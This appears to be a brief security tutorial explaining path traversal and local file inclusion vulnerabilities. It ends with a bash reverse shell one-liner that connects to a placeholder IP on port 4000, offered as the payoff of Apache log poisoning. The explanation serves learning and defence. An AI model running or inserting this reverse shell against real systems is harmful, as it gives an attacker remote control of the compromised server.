A path traversal attack (also known as directory traversal) aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files. It should be noted that access to files is limited by system operational access control (such as in the case of locked or in-use files on the Microsoft Windows operating system). Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others.

Exploiting a Path Traversal and a LFI in a server, could led us to open shell using a **simple reverse shell bash oneliner**, if we poison some part of the system, for example the Apache Logs in a Linux system, eg: [Apache Log Poisoning through LFI](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/).

```shell
bash -i >& /dev/tcp/<IP>/4000 0>&1
```
